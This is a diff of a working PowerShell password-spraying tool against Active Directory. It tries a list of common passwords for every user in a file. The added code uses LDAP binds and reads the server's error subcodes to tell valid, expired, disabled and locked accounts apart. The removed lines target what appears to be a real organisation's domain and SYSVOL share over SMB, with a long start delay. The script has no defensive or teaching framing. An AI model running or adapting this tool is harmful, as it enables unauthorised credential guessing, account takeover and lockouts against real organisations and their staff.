@@ -1,59 +1,95 @@
+Add-Type -AssemblyName System.DirectoryServices.Protocols
+
+# Users file
+$users = Get-Content ".\users.txt"
+
+# Password list
 $passwords = @(
-    "Aa123456",
+    "Ab123456",
     "Az123456",
-    "qwerty123"
+    "Aa123456"
 )
 
-Write-Host "Sleeping before starting..." -ForegroundColor Cyan
-Start-Sleep -Seconds 9000
-Write-Host "Starting now..." -ForegroundColor Green
+# User input
+$dc = Read-Host "Enter Domain Controller (example: DC01.Red.Team)"
+$domain = Read-Host "Enter Domain (example: Red.Team)"
 
 foreach ($password in $passwords){
-    Write-Host "--------- Curent Password $password ---------" -ForegroundColor Cyan
-    $users = Get-Content ".\usernames.txt"
-    $domain = "iai.co.il"
-    $target = "\\IAIES1\SYSVOL"
 
-    foreach ($username in $users) {
+    Write-Host "`n--------- Current Password $password ---------" -ForegroundColor Cyan
 
-    $username = $username.Trim()
+    foreach ($user in $users){
 
-    # ניקוי SMB sessions קודמות
-    cmd.exe /c "net use * /delete /y" | Out-Null
+        $user = $user.Trim()
 
-    try {
+        try {
 
-        $secure = ConvertTo-SecureString $password -AsPlainText -Force
+            $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($dc,389)
 
-        $cred = New-Object System.Management.Automation.PSCredential(
-            "$domain\$username",
-            $secure
-        )
+            $credential = New-Object System.Net.NetworkCredential(
+                "$user@$domain",
+                $password
+            )
 
-        New-PSDrive -Name "Z" `
-            -PSProvider FileSystem `
-            -Root $target `
-            -Credential $cred `
-            -ErrorAction Stop | Out-Null
+            #Negotiate
+            try {
 
-        Write-Host "[+] $username : VALID" -ForegroundColor Green
+                $connection = New-Object System.DirectoryServices.Protocols.LdapConnection(
+                    $identifier,
+                    $credential,
+                    [System.DirectoryServices.Protocols.AuthType]::Negotiate
+                )
 
-        Remove-PSDrive Z -Force -ErrorAction SilentlyContinue
+                $connection.SessionOptions.ProtocolVersion = 3
+                $connection.Timeout = New-TimeSpan -Seconds 5
+
+                $connection.Bind()
+            }
+            catch {
+
+                # fallback ל-Basic כדי לקבל LDAP subcodes
+                $connection = New-Object System.DirectoryServices.Protocols.LdapConnection(
+                    $identifier,
+                    $credential,
+                    [System.DirectoryServices.Protocols.AuthType]::Basic
+                )
+
+                $connection.SessionOptions.ProtocolVersion = 3
+                $connection.Timeout = New-TimeSpan -Seconds 5
+
+                $connection.Bind()
+            }
+
+            Write-Host "[+] $user : VALID" -ForegroundColor Green
+
+            $connection.Dispose()
+        }
+        catch {
+
+            $msg = $_.Exception.InnerException.ServerErrorMessage
+
+            if ($msg -match "data 52e") {
+                Write-Host "[-] $user : INVALID" -ForegroundColor Red
+            }
+            elseif ($msg -match "data 773") {
+                Write-Host "[!] $user : MUST CHANGE PASSWORD" -ForegroundColor Yellow
+            }
+            elseif ($msg -match "data 532") {
+                Write-Host "[!] $user : PASSWORD EXPIRED" -ForegroundColor Yellow
+            }
+            elseif ($msg -match "data 533") {
+                Write-Host "[!] $user : ACCOUNT DISABLED" -ForegroundColor Yellow
+            }
+            elseif ($msg -match "data 775") {
+                Write-Host "[!] $user : ACCOUNT LOCKED" -ForegroundColor Yellow
+            }
+            else {
+                Write-Host "[-] $user : ERROR" -ForegroundColor Magenta
+                Write-Host $_.Exception.Message
+            }
+        }
     }
-    catch {
 
-        $msg = $_.Exception.Message
-
-        if ($msg -match "must be changed") {
-            Write-Host "[!] $username : MUST CHANGE PASSWORD" -ForegroundColor Yellow
-        }
-        elseif ($msg -match "user name or password is incorrect") {
-            Write-Host "[-] $username : INVALID" -ForegroundColor Red
-        }
-        else {
-            Write-Host "[-] $username : ERROR" -ForegroundColor Magenta
-            Write-Host "    $msg"
-        }
-    }
-}
+    Write-Host "`nSleeping 3 Seconds before next password spray...`n" -ForegroundColor DarkGray
+    Start-Sleep -Seconds 3
 }
